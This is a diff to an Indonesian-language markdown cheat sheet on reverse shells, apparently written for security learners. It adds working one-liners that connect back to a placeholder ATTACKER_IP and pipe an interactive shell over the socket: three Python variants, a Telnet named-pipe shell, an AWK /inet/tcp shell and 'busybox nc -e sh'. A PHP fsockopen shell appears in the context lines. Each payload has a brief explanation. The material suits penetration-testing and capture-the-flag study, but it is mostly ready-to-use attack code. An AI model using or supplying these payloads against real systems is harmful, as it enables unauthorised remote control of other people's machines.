@@ -372,9 +372,21 @@ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
 
 ### Python
 
-Python ini bahasa wajib buat anak security. Hampir semua sistem Linux modern udah ada Python nya.
+Python ini bahasa wajib buat anak security. Hampir semua sistem Linux modern udah ada Python-nya.
 
-**Python Reverse Shell**
+**1. Python Reverse Shell by Exporting Environment Variables**
+
+```bash
+export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+**Penjelasan Payload:**
+
+- `export RHOST` & `export RPORT`: Kita set IP attacker dan Port sebagai environment variable dulu.
+- `os.getenv`: Python bakal baca variable RHOST dan RPORT tadi buat dipakek konek.
+- `pty.spawn("/bin/sh")`: Ini kuncinya buat dapet shell yang stabil (interaktif).
+
+**2. Python Reverse Shell Using the subprocess Module**
 
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -382,11 +394,59 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 **Penjelasan Payload:**
 
-- `python -c`: Jalanin kode Python langsung dari command line (inline).
-- `import socket,subprocess,os`: Import library yang dibutuhin buat networking dan sistem operasi.
-- `s=socket.socket(...)`: Bikin socket TCP connection.
-- `s.connect(("ATTACKER_IP",443))`: Connect ke IP attacker di port 443.
-- `os.dup2(s.fileno(),0/1/2)`: Ini bagian krusial. Dia nge-duplicate file descriptor socket (`s`) ke **stdin (0)**, **stdout (1)**, dan **stderr (2)**.
-- `subprocess.call(["/bin/sh","-i"])`: Jalanin shell interaktif `/bin/sh`.
+- `subprocess.call`: Kita pake modul `subprocess` buat ngejalanin shell `/bin/sh`.
+- `os.dup2`: Redirect stdin, stdout, stderr ke socket.
 
-Jadi, input/output dari shell `/bin/sh` bakal "numpang" lewat socket yang udah terkoneksi ke attacker.
+**3. Short Python Reverse Shell**
+
+```bash
+python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+```
+
+**Penjelasan Payload:**
+
+- Versi one-liner yang lebih ringkas.
+- Pake list comprehension `[os.dup2(...) for f in (0,1,2)]` biar hemat karakter.
+- Langsung spawn `/bin/bash`.
+
+### Others
+
+Selain bahasa pemrograman, kita juga bisa pake tools bawaan sistem kayak Telnet, AWK, dan BusyBox.
+
+**1. Telnet**
+
+```bash
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+```
+
+**Penjelasan:**
+
+- `mktemp -u`: Bikin nama file temporary unik.
+- `mkfifo $TF`: Bikin named pipe.
+- `telnet ...`: Konek ke attacker.
+- `| sh`: Output dari telnet (perintah dari attacker) di-pipe ke shell buat dieksekusi.
+
+**2. AWK**
+
+```bash
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
+```
+
+**Penjelasan:**
+
+- AWK punya fitur TCP built-in
+- `/inet/tcp/0/...`: Syntax khusus AWK buat buka koneksi TCP.
+- `|&`: Operator buat komunikasi dua arah di AWK.
+- Script ini intinya baca perintah dari attacker, jalanin, terus kirim balik outputnya.
+
+**3. BusyBox**
+
+```bash
+busybox nc ATTACKER_IP 443 -e sh
+```
+
+**Penjelasan:**
+
+- BusyBox itu kayak swiss army knife nya Linux embedded, isinya banyak tools standar yang digabung jadi satu binary kecil.
+- Payload ini sebenernya cuma manggil `nc` (Netcat) yang ada di dalem BusyBox.
+- `-e sh`: Execute shell setelah konek (fitur yang sering ilang di Netcat biasa, tapi ada di versi BusyBox).
